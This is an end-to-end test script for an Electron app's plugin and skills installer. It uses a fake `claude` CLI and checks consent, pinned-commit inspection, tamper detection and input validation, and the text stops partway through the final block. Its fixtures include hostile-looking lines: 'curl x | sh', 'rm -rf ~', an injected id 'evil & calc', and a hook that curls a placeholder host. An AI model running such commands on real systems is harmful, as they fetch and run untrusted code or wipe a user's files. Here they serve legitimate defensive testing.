// E2E: project skills setup (task-023) with a fake `claude` — nothing is really installed.
// The fake records every call (cwd + arguments), knows the official marketplace, and fails
// only for skill-creator. Usage: node scripts/test-electron-skills.js
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const { launchApp, waitFor, sleep } = require('./lib/cdp-app');

let pass = 0;
let fail = 0;
function check(name, cond, detail = '') {
  if (cond) { console.log(`  PASS  ${name}`); pass++; }
  else      { console.log(`  FAIL  ${name}${detail ? ' :: ' + detail : ''}`); fail++; }
}

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-skills-'));
const userData = path.join(tmp, 'user');
const project = path.join(tmp, 'my project');
const bin = path.join(tmp, 'bin');
for (const d of [userData, project, bin]) fs.mkdirSync(d, { recursive: true });
const callLog = path.join(tmp, 'claude-calls.log');
const fakeClaude = path.join(bin, 'claude.cmd');
fs.writeFileSync(fakeClaude, [
  '@echo off',
  `>> "${callLog}" echo %CD% ^| %*`,
  // task-025: what CLM_URL / keys the pane gave this process (key: only whether it is set)
  `>> "${callLog}.env" echo CLM_URL=%CLM_URL%`,
  // with the flag file present the machine "does not know" the official marketplace yet
  `if "%2"=="marketplace" if "%3"=="list" if exist "${path.join(tmp, 'no-market')}" (echo Configured marketplaces:& exit /b 0)`,
  // task-025: adding the typesafe-ai marketplace clones its listing (here: a fixture copy)
  `if "%2"=="marketplace" if "%3"=="add" if "%4"=="typesafe-ai/skills" (node "${path.join(tmp, 'make-ts-market.js')}"& exit /b 0)`,
  'if "%2"=="marketplace" (echo Configured marketplaces:& echo   claude-plugins-official& exit /b 0)',
  'if "%3"=="skill-creator@claude-plugins-official" (echo Failed to install plugin 1>&2& exit /b 1)',
  // a slow one, to see that a second install waits its turn
  'if "%3"=="claude-md-management@claude-plugins-official" ping -n 4 127.0.0.1 >nul',
  // record every install the way Claude does (installed_plugins.json + cache copy)
  `if "%2"=="install" node "${path.join(tmp, 'fake-install.js')}" %3 "%CD%"`,
  'echo Successfully installed plugin %3 (scope: project)',
  'exit /b 0',
].join('\r\n') + '\r\n');
fs.writeFileSync(path.join(project, 'CLAUDE.md'), '# My project\n\nOwn rules.\n');
// The official marketplace copy the app inspects (launchApp points CLAUDE_CONFIG_DIR here).
const market = path.join(userData, 'claude-config', 'plugins', 'marketplaces', 'claude-plugins-official');
const put = (rel, text) => { fs.mkdirSync(path.dirname(path.join(market, rel)), { recursive: true }); fs.writeFileSync(path.join(market, rel), text); };
put('.claude-plugin/marketplace.json', JSON.stringify({ name: 'claude-plugins-official', plugins: [
  { name: 'superpowers', source: { source: 'url', url: 'https://github.com/obra/superpowers.git', sha: '896224c4b1879920ab573417e68fd51d2ccc9072' } },
  { name: 'playwright', source: './external_plugins/playwright' },
  { name: 'code-review', source: './plugins/code-review' },
  { name: 'security-guidance', source: './plugins/security-guidance' },
] }));
put('external_plugins/playwright/.mcp.json', JSON.stringify({ playwright: { command: 'npx', args: ['@playwright/mcp@latest'] } }));
put('plugins/code-review/commands/code-review.md', '# review');
put('plugins/code-review/assets/icon.png', 'PNG-BYTES');
// main's native confirmation for third-party installs: answered from this file in the dev tree
const confirmFile = path.join(tmp, 'confirm');
fs.writeFileSync(confirmFile, 'yes');
process.env.CARROTCAP_TEST_CONFIRM_FILE = confirmFile;
delete process.env.TYPESAFE_API_KEY; // task-025: the "no key" note must show regardless of this machine
process.env.CARROTCAP_KEYS_FILE = path.join(tmp, 'keys', 'keys.env'); // …and regardless of the user's own keys.env
process.env.CARROTCAP_TEST_NO_EDITOR = '1'; // "API 키" button: no Notepad window during the test
process.env.CLM_URL = 'http://127.0.0.1:9'; // not used by the app (settings decide), kept off the real :8700
const asked = () => (fs.existsSync(confirmFile + '.log') ? fs.readFileSync(confirmFile + '.log', 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)) : []);
put('plugins/security-guidance/hooks/hooks.json', JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ type: 'command', command: 'python3 check.py' }] }] } }));
// task-025: the CLM server the CLM button looks for — off at first, a fake one is started later
const clmPort = 20000 + Math.floor(Math.random() * 20000);
fs.writeFileSync(path.join(userData, 'settings.json'), JSON.stringify({
  settingsVersion: 4,
  aor: { enabled: false, autoStart: false },
  cli: { claude: { command: fakeClaude, args: [] }, codex: { command: 'codex', args: [] }, grok: { command: 'grok', args: [] } },
  systemOne: { clmUrl: `http://127.0.0.1:${clmPort}` },
  defaultProjectPath: project,
  ui: {},
}));
fs.writeFileSync(path.join(userData, 'workspace-state.json'), JSON.stringify({ recentWorkspaces: [fs.realpathSync(project)] }));
const calls = () => (fs.existsSync(callLog) ? fs.readFileSync(callLog, 'utf8').split(/\r?\n/).filter(Boolean) : []);
const state = () => { try { return JSON.parse(fs.readFileSync(path.join(project, '.carrotcap', 'skills.json'), 'utf8')); } catch { return null; } };

// GitHub answers for the remote plugin (dev tree only — the packaged app ignores this, review r4)
const spSha = '896224c4b1879920ab573417e68fd51d2ccc9072';
const spRaw = (p) => `https://raw.githubusercontent.com/obra/superpowers/${spSha}/${p}`;
const spFiles = {
  '.claude-plugin/plugin.json': JSON.stringify({ name: 'superpowers', version: '6.0.3' }),
  'hooks/hooks.json': JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: '"${CLAUDE_PLUGIN_ROOT}/hooks/run-hook.cmd" session-start' }] }] } }),
  'hooks/run-hook.cmd': '@echo off\r\nbash "%~dp0session-start"\r\n',
  'hooks/session-start': '#!/bin/bash\ncurl -s https://example.invalid/ping\n',
  'skills/tdd/SKILL.md': '# TDD\n',
  'package.json': JSON.stringify({ name: 'sp', scripts: { postinstall: 'node setup.js' } }),
  'assets/logo.png': 'PNG',
};
const fixture = { [`https://api.github.com/repos/obra/superpowers/git/trees/${spSha}?recursive=1`]: JSON.stringify({ truncated: false, tree: Object.keys(spFiles).map((p) => ({ type: 'blob', path: p })) }) };
for (const [p, t] of Object.entries(spFiles)) fixture[spRaw(p)] = t;
fs.writeFileSync(path.join(tmp, 'github-fixture.json'), JSON.stringify(fixture));
process.env.CARROTCAP_TEST_GITHUB_FIXTURE = path.join(tmp, 'github-fixture.json');
// What the fake `claude plugin install <id>@...` leaves behind: superpowers from the fixture
// files, local plugins copied from the marketplace folder as it is at install time. With
// "bad-install" present, superpowers gets one file more than was inspected.
fs.writeFileSync(path.join(tmp, 'fake-install.js'), `
const fs = require('fs'); const path = require('path');
const id = process.argv[2].split('@')[0];
const cfg = process.env.CLAUDE_CONFIG_DIR;
const mkt = process.argv[2].split('@')[1];
const market = path.join(cfg, 'plugins', 'marketplaces', mkt);
const inst = path.join(cfg, 'plugins', 'cache', mkt, id, '1.0.0');
let sha = null;
if (id === 'superpowers') {
  fs.rmSync(inst, { recursive: true, force: true });
  for (const [p, t] of Object.entries(JSON.parse(${JSON.stringify(JSON.stringify(spFiles))}))) { const f = path.join(inst, ...p.split('/')); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, t); }
  if (fs.existsSync(${JSON.stringify(path.join(tmp, 'bad-install'))})) fs.writeFileSync(path.join(inst, 'extra.sh'), 'curl x | sh');
  sha = ${JSON.stringify(spSha)};
} else {
  const e = JSON.parse(fs.readFileSync(path.join(market, '.claude-plugin', 'marketplace.json'), 'utf8')).plugins.find((p) => p.name === id);
  if (!e) process.exit(0); // not in the local copy: nothing to record
  fs.rmSync(inst, { recursive: true, force: true });
  fs.cpSync(path.join(market, e.source), inst, { recursive: true });
  sha = 'c'.repeat(40);
}
const recFile = path.join(cfg, 'plugins', 'installed_plugins.json');
let rec = { version: 2, plugins: {} };
try { rec = JSON.parse(fs.readFileSync(recFile, 'utf8')); } catch {}
rec.plugins[process.argv[2]] = [{ scope: 'project', installPath: inst, version: '1.0.0', gitCommitSha: sha, projectPath: process.argv[3] }];
fs.writeFileSync(recFile, JSON.stringify(rec));
`);

// task-025: the typesafe-ai marketplace as `claude plugin marketplace add` leaves it (plugin = root "./")
fs.writeFileSync(path.join(tmp, 'make-ts-market.js'), `
const fs = require('fs'); const path = require('path');
const m = path.join(process.env.CLAUDE_CONFIG_DIR, 'plugins', 'marketplaces', 'typesafe-ai');
const put = (rel, t) => { fs.mkdirSync(path.dirname(path.join(m, rel)), { recursive: true }); fs.writeFileSync(path.join(m, rel), t); };
put('.claude-plugin/marketplace.json', JSON.stringify({ name: 'typesafe-ai', plugins: [{ name: 'typesafe', source: './' }] }));
put('.claude-plugin/plugin.json', JSON.stringify({ name: 'typesafe', version: '0.5.7' }));
put('skills/typesafe-ai/SKILL.md', '# Build with TypeSafe');
`);

(async () => {
  // CC_APP_EXE: run against a packaged build (copy of carrotcap.exe) instead of the dev tree
  const app = await launchApp(userData, process.env.CC_APP_EXE ? { exe: process.env.CC_APP_EXE } : {});
  const ev = app.ev;
  const modalOpen = () => ev(`!document.querySelector('#skills-modal').classList.contains('hidden')`);
  const rows = () => ev(`(document.querySelector('.tab-page .xterm-rows')||{}).innerText||''`);
  try {
    await waitFor(async () => /PS /.test(await rows()), { timeoutMs: 30000 });
    const root = await ev(`document.querySelector('#folder-path') && document.querySelector('#folder-path').textContent`);
    check('project folder is open', /my project/.test(root || ''), root);

    console.log('-- first START offers the setup');
    await ev(`document.querySelector('.btn-flow[data-flow="start"]').click(), true`);
    check('START opens the skills window', await waitFor(modalOpen, { timeoutMs: 10000 }));
    const listed = await ev(`[...document.querySelectorAll('#skills-list .skill-row')].map((r) => ({ id: r.querySelector('input').value, on: r.querySelector('input').checked, third: !!r.querySelector('.skill-maker.third'), inspect: r.querySelector('.skill-inspect').innerText }))`);
    check('whole catalog listed with makers', listed.length >= 8 && listed.some((r) => r.id === 'superpowers' && r.third) && listed.some((r) => r.id === 'code-review' && !r.third), JSON.stringify(listed.slice(0, 3)));
    check('every entry shows what it contains', listed.every((r) => /^구성:/.test(r.inspect)));
    check('web preset preselected — Anthropic plugins only', ['code-review', 'feature-dev', 'security-guidance', 'frontend-design'].every((id) => listed.find((r) => r.id === id && r.on)) && !listed.some((r) => r.third && r.on));
    check('nothing ran before the user chose', calls().length === 0);

    const inspectOf = (id) => ev(`document.querySelector('#skills-list input[value="${id}"]').closest('.skill-row').querySelector('.skill-inspect').innerText`);
    check('local plugins show what they run (MCP / hook commands)', /MCP 서버 1개/.test(await inspectOf('playwright')) && /훅 1개/.test(await inspectOf('security-guidance')) && /명령 1/.test(await inspectOf('code-review')));
    check('local plugins show the content scan (review r3)', /보안 점검 \(파일 \d+개 전체 본문 확인/.test(await inspectOf('security-guidance')) && /보안 점검/.test(await inspectOf('code-review')));
    check('npx-fetched MCP code is called out as not checkable here', /외부 패키지를 받아 실행.*npx @playwright\/mcp@latest/.test(await inspectOf('playwright')));
    check('a remote plugin offers "구성 불러오기" before anything else', /구성 불러오기/.test(await inspectOf('superpowers')) && /896224c/.test(await inspectOf('superpowers')));

    console.log('-- third-party plugins need explicit consent (review r1)');
    await ev(`document.querySelector('#skills-list input[value="playwright"]').click(), true`);
    check('ticking a third-party plugin shows the consent line', await ev(`!document.querySelector('#skills-third').hidden && /playwright/.test(document.querySelector('#skills-third-text').textContent)`));
    check('install is disabled until consent', await ev(`document.querySelector('#skills-install').disabled`));
    const noConsent = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['playwright'])`);
    check('main refuses a third-party install without consent', noConsent && noConsent.ok === false && /외부 제작/.test(noConsent.error || '') && calls().length === 0, JSON.stringify(noConsent));
    await ev(`document.querySelector('#skills-third-ok').click(), true`);
    check('consent enables install', !(await ev(`document.querySelector('#skills-install').disabled`)));
    if (!process.env.CC_APP_EXE) {
      console.log('-- main asks the user itself before a third-party install (review r8)');
      fs.writeFileSync(confirmFile, 'no');
      const nCalls = calls().length;
      const forged = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['playwright'], true)`);
      const q = asked().slice(-1)[0] || {};
      check('the renderer flag alone installs nothing: the user said no in the dialog', forged && forged.ok === false && forged.cancelled === true && calls().length === nCalls, JSON.stringify(forged));
      check('the dialog names the plugin, its maker, source and what it runs', /playwright — Microsoft/.test(q.detail || '') && /MCP playwright: npx @playwright\/mcp@latest/.test(q.detail || '') && /외부 패키지를 받아 실행/.test(q.detail || '') && /보안 점검/.test(q.detail || ''), JSON.stringify(q));
      fs.writeFileSync(confirmFile, 'yes');
    }
    await ev(`document.querySelector('#skills-list input[value="playwright"]').click(), true`); // untick again
    check('unticking hides the consent line', await ev(`document.querySelector('#skills-third').hidden && !document.querySelector('#skills-install').disabled`));

    console.log('-- a remote plugin is installable only after its pinned commit was inspected (review r2)');
    await ev(`document.querySelector('#skills-list input[value="superpowers"]').click(), true`);
    check('consent is not even possible before "구성 불러오기"', await ev(`document.querySelector('#skills-third-ok').disabled && document.querySelector('#skills-install').disabled && /구성 불러오기/.test(document.querySelector('#skills-third-text').textContent)`));
    const noInspect = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['superpowers'], true)`);
    check('main refuses it even with consent', noInspect && noInspect.ok === false && /확인/.test(noInspect.error || '') && calls().length === 0, JSON.stringify(noInspect));
    await ev(`document.querySelector('#skills-list input[value="superpowers"]').click(), true`);

    const nAsk = asked().length;
    // pick the backend preset, then add skill-creator (which the fake fails)
    await ev(`[...document.querySelectorAll('#skills-presets button')].find((b) => b.textContent === '백엔드·API').click(); document.querySelector('#skills-list input[value="skill-creator"]').click(); true`);
    await ev(`document.querySelector('#skills-install').click(), true`);
    check('install runs and reports a partial failure', await waitFor(async () => /skill-creator/.test(await ev(`document.querySelector('#skills-progress').innerText`)) && /✗/.test(await ev(`document.querySelector('#skills-progress').innerText`)), { timeoutMs: 30000 }), await ev(`document.querySelector('#skills-progress').innerText`));
    check('Anthropic-only installs do not open the confirmation dialog', asked().length === nAsk);
    const c = calls();
    const installs = c.filter((l) => / plugin install /.test(l));
    check('marketplace checked first (already known → not added)', / plugin marketplace list/.test(c[0] || '') && !c.some((l) => /marketplace add/.test(l)), JSON.stringify(c.slice(0, 2)));
    check('one install per chosen plugin, project scope, in the project folder', installs.length === 5 && installs.every((l) => l.includes(fs.realpathSync(project)) && /@claude-plugins-official --scope project$/.test(l)), JSON.stringify(installs));
    const st = state();
    check('skills.json records only what installed', !!st && JSON.stringify(st.installed) === JSON.stringify(['code-review', 'feature-dev', 'security-guidance', 'pr-review-toolkit']) && !st.rulesPending, JSON.stringify(st));
    const md = fs.readFileSync(path.join(project, 'CLAUDE.md'), 'utf8');
    check('CLAUDE.md keeps the user text and gains the rules block', md.startsWith('# My project\n\nOwn rules.') && /CARROTCAP:SKILLS:START/.test(md) && /\/code-review/.test(md) && !/skill-creator로/.test(md));
    check('window stays open on a partial failure, with a way on', await modalOpen() && /설치된 것으로 시작/.test(await ev(`document.querySelector('#skills-skip').textContent`)));
    await ev(`document.querySelector('#skills-skip').click(), true`);
    check('then START goes on: claude launched in the pane', await waitFor(async () => /agents\/supervisor\.md/.test(await rows()), { timeoutMs: 15000 }));

    console.log('-- second START does not ask again');
    await sleep(1000);
    const pluginCalls = () => calls().filter((l) => / plugin /.test(l)).length; // START itself runs (fake) claude
    const before = pluginCalls();
    await ev(`document.querySelector('.btn-flow[data-flow="start"]').click(), true`);
    await sleep(1500);
    check('no window, no install calls', !(await modalOpen()) && pluginCalls() === before);

    console.log('-- SKILLS button: re-run keeps one block; unknown marketplace is added project-scoped');
    fs.writeFileSync(path.join(tmp, 'no-market'), '');
    await ev(`document.querySelector('#skills-open').click(), true`);
    check('SKILLS opens the window', await waitFor(modalOpen));
    check('installed ones are shown as installed', await ev(`[...document.querySelectorAll('#skills-list .skill-row')].filter((r) => r.querySelector('.skill-done')).length`) === 4);
    await ev(`document.querySelectorAll('#skills-list input').forEach((c) => { c.checked = c.value === 'frontend-design'; }); document.querySelector('#skills-install').click(); true`);
    check('single install closes the window', await waitFor(async () => !(await modalOpen()), { timeoutMs: 20000 }));
    check('marketplace added with --scope project', calls().some((l) => / plugin marketplace add anthropics\/claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().filter((l) => /marketplace/.test(l))));
    fs.rmSync(path.join(tmp, 'no-market'));
    const md2 = fs.readFileSync(path.join(project, 'CLAUDE.md'), 'utf8');
    check('block replaced, not duplicated; now includes frontend-design too', md2.split('CARROTCAP:SKILLS:START').length === 2 && /frontend-design/.test(md2) && /\/code-review/.test(md2));
    check('skills.json merged', (state().installed || []).includes('frontend-design') && state().installed.includes('code-review'));

    console.log('-- rules that cannot be written are remembered (review r1)');
    const claudeMd = path.join(project, 'CLAUDE.md');
    const elsewhere = path.join(tmp, 'elsewhere.md');
    fs.renameSync(claudeMd, elsewhere);
    fs.linkSync(elsewhere, claudeMd); // hard link to a file outside the project
    const hl = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['commit-commands'])`);
    check('hard-linked CLAUDE.md is refused, install still recorded', hl && hl.ok === false && /CLAUDE\.md/.test(hl.error || '') && state().installed.includes('commit-commands') && state().rulesPending === true, JSON.stringify(hl));
    check('the linked file was not changed', !/commit-commands/.test(fs.readFileSync(elsewhere, 'utf8')));
    check('START would offer the setup again', await ev(`window.CarrotcapSkills.needsSetup(${JSON.stringify(project)})`));
    fs.rmSync(claudeMd);
    fs.renameSync(elsewhere, claudeMd);

    console.log('-- one install at a time (review r2)');
    const both = await ev(`Promise.all([window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['claude-md-management']), new Promise((r) => setTimeout(r, 300)).then(() => window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['commit-commands']))])`);
    check('a second install while one runs is refused', both[0].ok === true && both[1].ok === false && /이미 설치 중/.test(both[1].error || ''), JSON.stringify(both.map((b) => b.error || b.ok)));

    console.log('-- the browser view does not cover the window (review r2)');
    const http = require('http');
    const srv = http.createServer((q, s) => { s.writeHead(200, { 'content-type': 'text/html' }); s.end('<title>page</title><h1>page</h1>'); });
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const site = `http://127.0.0.1:${srv.address().port}/`;
    await ev(`document.querySelector('#toggle-browser').click(); document.querySelector('#br-url').value = ${JSON.stringify(site)}; document.querySelector('#br-go').click(); true`);
    const page = await app.connect((t) => t.type === 'page' && t.url === site);
    const viewWidth = () => ev(`window.CarrotcapBrowser.lastBounds().width || 0`);
    await waitFor(async () => (await page.ev('innerWidth')) > 100 && (await viewWidth()) > 100);
    await ev(`window.CarrotcapSkills.open(${JSON.stringify(project)}, { reason: 'manual' }); true`);
    check('browser view shrinks to nothing while the skills window is open', await waitFor(async () => (await viewWidth()) === 0 && (await modalOpen())));
    await ev(`document.querySelector('#skills-close').click(), true`);
    check('and comes back when it closes', await waitFor(async () => (await viewWidth()) > 100));
    page.close();
    srv.close();
    await ev(`document.querySelector('#toggle-browser').click(), true`);

    if (!process.env.CC_APP_EXE) {
      console.log('-- remote plugin: inspect → review → consent → install (review r4)');
      await ev(`window.CarrotcapSkills.open(${JSON.stringify(project)}, { reason: 'manual' }); true`);
      await waitFor(modalOpen);
      await ev(`document.querySelectorAll('#skills-list input').forEach((c) => { c.checked = false; }); document.querySelector('#skills-list input[value="superpowers"]').click(); true`);
      await ev(`document.querySelector('#skills-list input[value="superpowers"]').closest('.skill-row').querySelector('.skill-inspect-btn').click(), true`);
      const spText = () => inspectOf('superpowers');
      check('inspection result is shown in the window', await waitFor(async () => /보안 점검 \(파일 6개 전체 본문 확인, 이미지·글꼴 1개 제외\)/.test(await spText()), { timeoutMs: 10000 }), await spText());
      const spBox = `document.querySelector('#skills-list input[value="superpowers"]').closest('.skill-row').querySelector('.skill-inspect')`;
      check('the hook script body can be opened and read', await ev(`[...${spBox}.querySelectorAll('pre.skill-body')].some((p) => p.textContent.includes('bash "%~dp0session-start"'))`));
      await ev(`${spBox}.querySelectorAll('details').forEach((d) => { d.open = true; }); true`);
      const spAll = await spText();
      check('extensionless script and package.json install script are flagged', /\[네트워크\] hooks\/session-start:2/.test(spAll) && /\[설치 때 자동 실행\] package\.json — scripts\.postinstall: node setup\.js/.test(spAll), spAll);
      check('consent becomes possible only now', await ev(`!document.querySelector('#skills-third-ok').disabled && document.querySelector('#skills-install').disabled`));
      // the listed commit changes after the check: the old inspection no longer counts
      const mj = path.join(market, '.claude-plugin', 'marketplace.json');
      const mjText = fs.readFileSync(mj, 'utf8');
      fs.writeFileSync(mj, mjText.replace(spSha, 'a'.repeat(40)));
      const moved = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['superpowers'], true)`);
      check('a different pinned commit at install time is refused', moved && moved.ok === false && /확인/.test(moved.error || ''), JSON.stringify(moved));
      fs.writeFileSync(mj, mjText);
      console.log('-- the installed copy must be what was inspected (review r5)');
      fs.writeFileSync(path.join(tmp, 'bad-install'), '');
      const before1 = calls().length;
      const badRun = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['superpowers'], true)`);
      const undo = calls().slice(before1);
      check('an install with a file that was never shown fails', badRun && badRun.ok === false && /확인하지 않은 파일.*extra\.sh/.test(((badRun.results || [])[0] || {}).out || ''), JSON.stringify(badRun));
      check('and is uninstalled again (project scope)', undo.some((l) => / plugin uninstall superpowers@claude-plugins-official --scope project$/.test(l)), JSON.stringify(undo));
      check('it is not recorded as installed', !(state().installed || []).includes('superpowers'));
      fs.rmSync(path.join(tmp, 'bad-install'));
      await ev(`window.CarrotcapSkills.open(${JSON.stringify(project)}, { reason: 'manual' }); true`).catch(() => {});
      const before2 = calls().length;
      await ev(`document.querySelector('#skills-third-ok').click(); document.querySelector('#skills-install').click(); true`);
      check('after consent it installs', await waitFor(async () => !(await modalOpen()), { timeoutMs: 20000 }));
      check('with the fixed argv, project scope', calls().slice(before2).some((l) => l.includes(fs.realpathSync(project)) && / plugin install superpowers@claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().slice(before2)));
      check('a matching install is kept and recorded', (state().installed || []).includes('superpowers') && !calls().slice(before2).some((l) => /uninstall/.test(l)));
    }

    console.log('-- local Anthropic plugins are compared with what the window showed too (review r6)');
    const crFile = path.join(market, 'plugins', 'code-review', 'commands', 'code-review.md');
    fs.writeFileSync(crFile, '# review\nrm -rf ~\n'); // changed after the window listed it
    const before3 = calls().length;
    const crRun = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
    const crOut = ((crRun && crRun.results) || [])[0] || {};
    check('a local plugin that changed since it was shown fails the check', crRun && crRun.ok === false && /commands\/code-review\.md의 내용이 확인한 것과 다릅니다/.test(crOut.out || ''), JSON.stringify(crRun));
    check('and is uninstalled again', calls().slice(before3).some((l) => / plugin uninstall code-review@claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().slice(before3)));
    fs.writeFileSync(crFile, '# review');
    const crExtra = path.join(market, 'plugins', 'code-review', 'commands', 'added.md');
    fs.writeFileSync(crExtra, '# added after the window showed the plugin');
    const crRun2 = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
    check('a file added since it was shown fails the check (review r7)', crRun2 && crRun2.ok === false && /확인하지 않은 파일.*commands\/added\.md/.test((((crRun2.results) || [])[0] || {}).out || ''), JSON.stringify(crRun2));
    fs.rmSync(crExtra);
    const crPng = path.join(market, 'plugins', 'code-review', 'assets', 'icon.png');
    fs.writeFileSync(crPng, 'PNG-OTHER');
    const crRun3 = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
    check('changed image bytes since shown fail the check (review r8)', crRun3 && crRun3.ok === false && /assets\/icon\.png의 내용이 확인한 것과 다릅니다/.test((((crRun3.results) || [])[0] || {}).out || ''), JSON.stringify(crRun3));
    fs.rmSync(crPng);
    const crRun4 = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
    check('a shown file missing from the install fails the check', crRun4 && crRun4.ok === false && /설치되지 않았습니다: assets\/icon\.png/.test((((crRun4.results) || [])[0] || {}).out || ''), JSON.stringify(crRun4));
    fs.writeFileSync(crPng, 'PNG-BYTES');
    const crOk = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
    check('unchanged, it installs and is kept', crOk && crOk.ok === true, JSON.stringify(crOk));

    console.log('-- a third-party entry with an unsupported source cannot be installed (review r7)');
    const mj2 = path.join(market, '.claude-plugin', 'marketplace.json');
    const mj2Text = fs.readFileSync(mj2, 'utf8');
    fs.writeFileSync(mj2, mj2Text.replace('"./external_plugins/playwright"', '"https://example.invalid/pw.git"'));
    const before4 = calls().length;
    const pwBad = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['playwright'], true)`);
    check('refused even with consent, nothing run', pwBad && pwBad.ok === false && /확인할 수 없거나/.test(pwBad.error || '') && calls().length === before4, JSON.stringify(pwBad));
    fs.writeFileSync(mj2, mj2Text);

    console.log('-- the main side only takes catalog ids and allowed folders');
    const bad = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['evil & calc', '__proto__'])`);
    check('unknown ids refused', bad && bad.ok === false);
    const outside = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(tmp)}, ['code-review'])`);
    check('folder outside the allowed workspaces refused', outside && outside.ok === false && /폴더/.test(outside.error || ''));

    console.log('-- task-025: SETUP put the System One scripts into the project (also for a packaged build)');
    const pScripts = path.join(project, 'scripts');
    check('scripts/system-one.js and scripts/setup-clm.sh copied', fs.existsSync(path.join(pScripts, 'system-one.js')) && fs.existsSync(path.join(pScripts, 'setup-clm.sh')));
    check('the copies are the shipped files (LF kept for bash)', fs.readFileSync(path.join(pScripts, 'setup-clm.sh'), 'utf8') === fs.readFileSync(path.join(__dirname, 'setup-clm.sh'), 'utf8') && !fs.readFileSync(path.join(pScripts, 'setup-clm.sh'), 'utf8').includes(String.fromCharCode(13))
      && fs.readFileSync(path.join(pScripts, 'system-one.js'), 'utf8') === fs.readFileSync(path.join(__dirname, 'system-one.js'), 'utf8'));

    console.log('-- task-025: CLM button, CLM server off, Jev not installed → SKILLS window with Jev ticked');
    const jevCalls = () => calls().filter((l) => /\/typesafe:typesafe-ai/.test(l)).length;
    check('Jev not installed yet', (await ev(`window.carrotcap.jevStatus(${JSON.stringify(project)})`)).installed === null);
    check('CLM server reported down', (await ev(`window.carrotcap.clmStatus()`)).up === false);
    await ev(`document.querySelector('.btn-flow[data-flow="clm"]').click(), true`);
    check('CLM flow (no server) opens the skills window for the Jev fallback', await waitFor(modalOpen, { timeoutMs: 10000 }));
    check('typesafe (Jev) is ticked, reason says Jev', await ev(`document.querySelector('#skills-list input[value="typesafe"]').checked && /Jev/.test(document.querySelector('#skills-reason').textContent) && /Jev 시작/.test(document.querySelector('#skills-install').textContent)`));
    check('its marketplace is missing → "마켓 추가" offered, nothing run yet', /마켓 추가 \(typesafe-ai\)/.test(await inspectOf('typesafe')) && jevCalls() === 0);
    check('not installable before the marketplace is there', await ev(`document.querySelector('#skills-install').disabled && document.querySelector('#skills-third-ok').disabled`));
    const beforeMk = calls().length;
    await ev(`document.querySelector('#skills-list input[value="typesafe"]').closest('.skill-row').querySelector('.skill-market-btn').click(), true`);
    check('after "마켓 추가" the local copy is inspected (skill 1, v0.5.7)', await waitFor(async () => /스킬 1/.test(await inspectOf('typesafe')) && /v0\.5\.7/.test(await inspectOf('typesafe')), { timeoutMs: 15000 }), await inspectOf('typesafe'));
    check('marketplace added with the fixed argv, project scope, in the project', calls().slice(beforeMk).some((l) => l.includes(fs.realpathSync(project)) && / plugin marketplace add typesafe-ai\/skills --scope project$/.test(l)), JSON.stringify(calls().slice(beforeMk)));
    check('the tick survives the reload', await ev(`document.querySelector('#skills-list input[value="typesafe"]').checked`));
    await ev(`document.querySelector('#skills-third-ok').click(), true`);
    const nAskJ = asked().length;
    await ev(`document.querySelector('#skills-install').click(), true`);
    check('installed → window closes and claude starts with the Jev skill', await waitFor(async () => !(await modalOpen()) && jevCalls() === 1, { timeoutMs: 30000 }), await ev(`document.querySelector('#skills-progress').innerText`));
    check('typesafe@typesafe-ai installed, project scope', calls().some((l) => / plugin install typesafe@typesafe-ai --scope project$/.test(l)));
    if (!process.env.CC_APP_EXE) {
      check('main asked with its own dialog (third-party)', asked().length === nAskJ + 1 && /typesafe — TypeSafe AI/.test(asked().slice(-1)[0].detail || ''));
    }
    check('now Jev counts as installed for this project', (await ev(`window.carrotcap.jevStatus(${JSON.stringify(project)})`)).installed === 'project');
    check('rules block names typesafe@typesafe-ai', /typesafe@typesafe-ai/.test(fs.readFileSync(path.join(project, 'CLAUDE.md'), 'utf8')));
    const fsText = await ev(`document.querySelector('#flow-status').textContent`);
    check('status says CLM was off, Jev used, and no API key (never a key)', /CLM 서버/.test(fsText) && /Jev로 대체/.test(fsText) && /TYPESAFE_API_KEY/.test(fsText) && /keys.env/.test(fsText), fsText);
    check('the pane got CLM_URL from settings', fs.readFileSync(callLog + '.env', 'utf8').includes(`CLM_URL=http://127.0.0.1:${clmPort}`));

    console.log('-- task-025: CLI JEV button once installed');
    await sleep(1000);
    await ev(`document.querySelector('.btn-cli[data-skill="jev"]').click(), true`);
    check('no window; claude started with the Jev skill in the active pane', await waitFor(async () => jevCalls() === 2, { timeoutMs: 15000 }) && !(await modalOpen()));
    const badMk = await ev(`window.carrotcap.skillsAddMarketplace(${JSON.stringify(project)}, 'code-review')`);
    const outMk = await ev(`window.carrotcap.skillsAddMarketplace(${JSON.stringify(tmp)}, 'typesafe')`);
    check('add-marketplace only for catalog entries with their own marketplace, only in allowed folders', badMk.ok === false && outMk.ok === false && /폴더/.test(outMk.error || ''), JSON.stringify([badMk, outMk]));

    console.log('-- task-026 fix: official entries never offer "마켓 추가" (the install adds that marketplace)');
    fs.renameSync(market, market + '.away');
    try {
      const cat = await ev(`window.carrotcap.skillsCatalog()`);
